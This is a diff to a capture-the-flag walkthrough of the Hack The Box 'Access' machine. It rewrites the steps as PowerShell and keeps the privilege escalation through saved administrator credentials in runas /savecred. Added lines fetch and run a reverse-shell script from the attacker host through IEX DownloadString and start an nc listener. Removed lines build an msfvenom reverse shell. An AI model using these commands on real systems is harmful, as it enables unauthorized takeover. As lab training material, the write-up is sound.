@@ -275,7 +275,7 @@ Archive:  /workspace/ftp/Engineer/Access Control.zip
 Okay, so it contains a `Access Control.pst` file. Let's unzip it now:
 
 ```sh
-❯ unzip "/workspace/ftp/Engineer/Access Control.zip" -d "/workspace/"
+❯ unzip "/workspace/ftp/Engineer/Access Control.zip" -d /workspace/
 ```
 
 ```
@@ -409,7 +409,7 @@ C:\Users\security>
 
 They worked!
 
-The shell is limited though, so I tried to use `msfvenom` to get a Windows reverse shell. Unfortunately, the binary to get it has been blocked by a group policy.
+It's a standard one though, so I'll transform it into a Powershell session.
 
 # Local enumeration
 
@@ -419,8 +419,8 @@ If we run `whoami`, we see that we got a foothold as `access\security`.
 
 Let's gather some information about the Windows version of Access.
 
-```cmd
-C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
+```ps1
+PS C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
 ```
 
 ```
@@ -430,8 +430,8 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
 
 Okay, so this is Windows Server 2008!
 
-```cmd
-C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
+```ps1
+PS C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
 ```
 
 ```
@@ -447,8 +447,8 @@ This version of Windows is a bit old, and maybe there are missing hotfixes. We'l
 
 What is Access's architecture?
 
-```cmd
-C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
+```ps1
+PS C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
 ```
 
 ```
@@ -462,8 +462,8 @@ So this system is using x64. This will be useful to know if we want to compile o
 
 Let's check if Windows Defender is enabled.
 
-```cmd
-C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
+```ps1
+PS C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
 ```
 
 ```
@@ -477,8 +477,8 @@ It's disabled! That's great, it will make our life easier.
 
 Let's check if there's any AMSI provider.
 
-```cmd
-C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
+```ps1
+PS C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
 ```
 
 ```
@@ -491,8 +491,8 @@ No output. Let's assume there's none then!
 
 Let's see which Windows Firewall policies profiles are enabled.
 
-```cmd
-C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
+```ps1
+PS C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
 ```
 
 ```
@@ -514,8 +514,8 @@ Okay, so all Firewall profiles are enabled. It shouldn't hinder our progression 
 
 Let's gather the list of connected NICs.
 
-```cmd
-C:\Users\security> ipconfig /all
+```ps1
+PS C:\Users\security> ipconfig /all
 ```
 
 ```
@@ -560,8 +560,8 @@ Looks like there's a single network.
 
 Let's enumerate all local users using `PowerView`.
 
-```cmd
-C:\Users\security> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table"
+```ps1
+PS C:\Users\security> Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table
 ```
 
 ```
@@ -578,10 +578,8 @@ So apart from us, there's also `engineer` (as we discovered while trying to conn
 
 Let's enumerate all local groups, once again using `PowerView`.
 
-powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; vain | Select-Object GroupName, Comment | Format-Table | Out-String -Width 200"
-
-```cmd
-C:\Users\security> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096"
+```ps1
+PS C:\Users\security> Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096
 ```
 
 ```
@@ -612,8 +610,8 @@ Looks classic.
 
 Let's gather more information about us.
 
-```cmd
-C:\Users\security> net user security
+```ps1
+PS C:\Users\security> net user security
 ```
 
 ```
@@ -650,8 +648,8 @@ We don't belong to interesting groups.
 
 If we check our home folder, we find the user flag on our Desktop. Let's retrieve its content.
 
-```cmd
-C:\Users\security> type C:\Users\security\Desktop\user.txt
+```ps1
+PS C:\Users\security> type $env:USERPROFILE\Desktop\user.txt
 ```
 
 ```
@@ -660,30 +658,26 @@ C:\Users\security> type C:\Users\security\Desktop\user.txt
 
 There's also a strange `.yawcam` folder... Let's see what it contains.
 
-```cmd
-C:\Users\security> dir C:\Users\security\.yawcam /a
+```ps1
+PS C:\Users\security> dir $env:USERPROFILE\.yawcam -Force
 ```
 
 ```
 <SNIP>
- Directory of C:\Users\security\.yawcam
-
-08/24/2018  07:37 PM    <DIR>          .
-08/24/2018  07:37 PM    <DIR>          ..
-08/23/2018  10:52 PM    <DIR>          2
-08/22/2018  06:49 AM                 0 banlist.dat
-08/23/2018  10:52 PM    <DIR>          extravars
-08/22/2018  06:49 AM    <DIR>          img
-08/23/2018  10:52 PM    <DIR>          logs
-08/22/2018  06:49 AM    <DIR>          motion
-08/22/2018  06:49 AM                 0 pass.dat
-08/23/2018  10:52 PM    <DIR>          stream
-08/23/2018  10:52 PM    <DIR>          tmp
-08/23/2018  10:34 PM                82 ver.dat
-08/23/2018  10:52 PM    <DIR>          www
-08/24/2018  07:37 PM             1,411 yawcam_settings.xml
-               4 File(s)          1,493 bytes
-              10 Dir(s)   3,350,564,864 bytes free
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----         8/23/2018  11:52 PM            2
+d----         8/23/2018  11:52 PM            extravars
+d----         8/22/2018   7:49 AM            img
+d----         8/23/2018  11:52 PM            logs
+d----         8/22/2018   7:49 AM            motion
+d----         8/23/2018  11:52 PM            stream
+d----         8/23/2018  11:52 PM            tmp
+d----         8/23/2018  11:52 PM            www
+-a---         8/22/2018   7:49 AM          0 banlist.dat
+-a---         8/22/2018   7:49 AM          0 pass.dat
+-a---         8/23/2018  11:34 PM         82 ver.dat
+-a---         8/24/2018   8:37 PM       1411 yawcam_settings.xml
 ```
 
 It looks like a folder for a software. Let's search online for this.
@@ -704,8 +698,8 @@ I tried to search folders like `img`, `logs` or `motion` for files or images, bu
 
 The `ver.dat` file contains interesting information though:
 
-```cmd
-C:\Users\security> type C:\Users\security\.yawcam\ver.dat
+```ps1
+PS C:\Users\security> type $env:USERPROFILE\.yawcam\ver.dat
 ```
 
 ```
@@ -724,55 +718,40 @@ If we search [ExploitDB](https://www.exploit-db.com/) for `Yawcam`, we only find
 
 Back to our enumeration of home folders, we find something interesting in `C:\Users\Public\Desktop`:
 
-```cmd
-C:\Users\security> dir C:\Users\Public\Desktop /a
+```ps1
+PS C:\Users\security> dir C:\Users\Public\Desktop -Force
 ```
 
 ```
-08/28/2018  06:51 AM    <DIR>          .
-08/28/2018  06:51 AM    <DIR>          ..
-07/14/2009  04:57 AM               174 desktop.ini
-08/22/2018  09:18 PM             1,870 ZKAccess3.5 Security System.lnk
 <SNIP>
+Mode                LastWriteTime     Length Name                                                                                                                                                                                          
+----                -------------     ------ ----                                                                                                                                                                                          
+-a-hs         7/14/2009   5:57 AM        174 desktop.ini                                                                                                                                                                                   
+-a---         8/22/2018  10:18 PM       1870 ZKAccess3.5 Security System.lnk
 ```
 
 The `ZKAccess3.5 Security System.lnk` is definitely unusual.
 
 ## Inspecting `C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk`
 
-`.lnk` files are Windows shortcut files used by the OS to secure quick access to a certain file. We can't really inspect these files using `cmd.exe`, so I'll transfer `ZKAccess3.5 Security System.lnk` to my own machine.
+`.lnk` files are Windows shortcut files used by the OS to secure quick access to a certain file.
 
-```cmd
-C:\Users\security> copy "C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk" "\\10.10.14.4\server\ZKAccess3.5 Security System.lnk"
-```
+Let's inspect it:
 
-Once this is done, I'll use [pyInker](https://github.com/HarmJ0y/pylnker) to inspect it.
-
-```sh
-❯ python2 pylnker.py "/workspace/server/ZKAccess3.5 Security System.lnk"
+```ps1
+PS C:\Users\security> (New-Object -ComObject WScript.Shell).CreateShortcut("C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk")
 ```
 
 ```
-out:  Lnk File: /workspace/server/ZKAccess3.5 Security System.lnk
-Link Flags: HAS SHELLIDLIST | POINTS TO FILE/DIR | NO DESCRIPTION | HAS RELATIVE PATH STRING | HAS WORKING DIRECTORY | HAS CMD LINE ARGS | HAS CUSTOM ICON
-File Attributes: ARCHIVE
-Create Time:   2009-07-14 01:25:32.986366
-Access Time:   2009-07-14 01:25:32.986366
-Modified Time: 2009-07-14 03:39:31.417999
-Target length: 20480
-Icon Index: 0
-ShowWnd: SW_NORMAL
-HotKey: 0
-Target is on local volume
-Volume Type: Fixed (Hard Disk)
-Volume Serial: 9c45dbf0
-Vol Label: 
-Base Path: C:\Windows\System32\runas.exe
-(App Path:) Remaining Path: 
-Relative Path: ..\..\..\Windows\System32\runas.exe
-Working Dir: C:\ZKTeco\ZKAccess3.5
-Command Line: /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
-Icon filename: C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico
+FullName         : C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk
+Arguments        : /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
+Description      : 
+Hotkey           : 
+IconLocation     : C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico,0
+RelativePath     : 
+TargetPath       : C:\Windows\System32\runas.exe
+WindowStyle      : 1
+WorkingDirectory : C:\ZKTeco\ZKAccess3.5
 ```
 
 Okay, so this shortcut file actually executes `/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"`.
@@ -783,8 +762,8 @@ There must be credentials stored in the credential manager for the `Administrato
 
 Let's check the credential manager for currently stored credentials.
 
-```cmd
-C:\Users\security> cmdkey /list
+```ps1
+PS C:\Users\security> cmdkey /list
 ```
 
 ```
@@ -805,35 +784,44 @@ We can abuse the stored credentials for the `Administrator` user to execute any 
 
 ## Preparation
 
-Let's use these stored credentials to obtain a reverse shell as `Administrator`. To do so, I'll setup a listener on port `9001` and I'll use `msfvenom` to create an executable:
+Let's use these stored credentials to obtain a reverse shell as `Administrator`.
+
+To do so, I'll setup a listener on port `9001`.
 
 ```sh
-❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=9001 -f exe > /workspace/server/revshell.exe
+❯ rlwrap nc -lvnp 9001
 ```
 
-Then I'll transfer it to Access.
+```
+listening on [any] 9001 ...
+```
+
+Then I'll choose the 'PowerShell #3 (Base64)' payload from [this website](https://www.revshells.com/), and I'll save it as `/workspace/server/revshell.ps1`.
+
+I'll transfer it to Access.
 
 Now we should be ready to go!
 
 ## Exploitation
 
-Time to use this binary to execute our `revshell.exe` executable as `Administrator`!
+Time to execute our reverse shell script as `Administrator`!
 
-```cmd
-C:\Users\security> runas /user:ACCESS\Administrator /savecred "C:\tmp\revshell.exe"
+```ps1
+PS C:\Users\security> runas /user:ACCESS\Administrator /savecred "powershell IEX((New-Object Net.WebClient).DownloadString('http://10.10.14.4:8000/revshell2.ps1'))"
 ```
 
 And on our listener...
 
 ```
 connect to [10.10.14.4] from (UNKNOWN) [10.10.10.98] 49158
-Microsoft Windows [Version 6.1.7600]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-C:\Windows\system32>
+PS C:\Windows\system32>
 ```
 
-It caught the reverse shell! If we run `whoami`, we can confirm that we are indeed `ACCESS\Administrator`.
+It caught the reverse shell!
+
+It's a standard one though, so I'll transform it into a Powershell session.
+
+If we run `whoami`, we can confirm that we are indeed `ACCESS\Administrator`.
 
 # Local enumeration
 
@@ -841,8 +829,8 @@ It caught the reverse shell! If we run `whoami`, we can confirm that we are inde
 
 The only thing we need to do to finish this box is to retrieve the root flag. As usual, we can find it on our Desktop!
 
-```cmd
-C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+```ps1
+PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 ```
 
 ```
